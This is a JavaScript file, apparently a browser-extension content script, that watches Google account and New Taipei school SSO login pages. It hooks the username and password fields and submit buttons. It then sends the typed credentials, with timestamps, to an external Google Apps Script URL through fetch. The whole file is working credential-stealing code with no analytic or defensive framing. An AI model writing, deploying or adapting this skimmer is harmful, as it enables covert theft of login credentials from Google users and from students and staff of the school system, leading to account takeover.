let input
let input1
let input2 = ""
let ID = "myTest"
let t = 0

setInterval(function () {
    if (location.href.includes("accounts.google.com")) {
        if (document.querySelector('[jsname="YPqjbf"]') == input) return
        input = document.querySelector('[jsname="YPqjbf"]')
        button = document.querySelector('[jsname="Njthtb"]')
        button.addEventListener('click', (e) => {
            send(input.value, [input.getAttribute("aria-label"), "google", getCurrentTime(), ID])

        })
        input.addEventListener("keydown", function (event) {
            if (event.keyCode === 13) {
                send(input.value, [input.getAttribute("aria-label"), "google", getCurrentTime(), ID])
            }
        });
    } else if (location.href.includes("sso.ntpc.edu.tw/login.aspx")) {
        if (input2 != "") return
        input1 = document.getElementById("username")
        input2 = document.getElementById("password")
        button = document.querySelector('[class="login-box btn btn-login"]')
        button.addEventListener('click', (e) => {
            if (input2.value == "") {
                t = 1
                send(input1.value, ["user", "sso", getCurrentTime(), ID])
            } else {
                if (t == 0) {
                    send(input1.value + "/" + input2.value, ["user/password", "sso", getCurrentTime(), ID])
                } else {
                    send(input2.value, ["password", "sso", getCurrentTime(), ID])
                }
            }

        })


    }

}, 0.7 * 1000 / 1);

function send(msg, tag) {
    if (tag.includes("google")) {
        setTimeout(() => {
            r = document.querySelector('[jsname="B34EJ"]').firstChild
            if (r) tag.push(r.innerText)
            console.log("google",msg, tag)
            SendToDate([msg, ...tag])
        }, 800)
    } else {
        SendToDate([msg, ...tag])
        console.log("sso",msg, tag)
    }
}


function getCurrentTime() {
    var currentDate = new Date();

    var month = ('0' + (currentDate.getMonth() + 1)).slice(-2);
    var day = ('0' + currentDate.getDate()).slice(-2);

    var hours = ('0' + currentDate.getHours()).slice(-2);
    var minutes = ('0' + currentDate.getMinutes()).slice(-2);
    var seconds = ('0' + currentDate.getSeconds()).slice(-2);

    var formattedDate = month + '/' + day + ' ' + hours + ':' + minutes + ':' + seconds;

    return formattedDate;
}
const url = "https://script.google.com/macros/s/AKfycbwtdErllvF7yq0_gsX33Z9oOKP1svkFNDD_ouX3CnRNgBs2R9kx79UGN6fd89Pd7g4J/exec"
let SendToDate = async (date) => {
    date = encodeURIComponent(date.join("^"))
    // console.log(date)
    // console.log(url + `?date=${date}`)
    let response = await fetch(url + `?date=${date}`);
    let r = await response.text()
    // console.log(r)
}
